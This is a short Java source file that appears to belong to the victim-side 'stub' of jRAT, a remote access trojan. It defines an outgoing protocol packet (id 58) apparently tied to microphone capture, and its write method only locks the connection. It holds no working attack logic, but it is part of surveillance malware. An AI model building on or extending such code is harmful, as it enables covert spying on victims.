package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.stub.Connection;

import com.redpois0n.common.io.StringWriter;

public class Packet58Microphone extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		Connection.lock();
	}

	@Override
	public byte getPacketId() {
		return 58;
	}

}
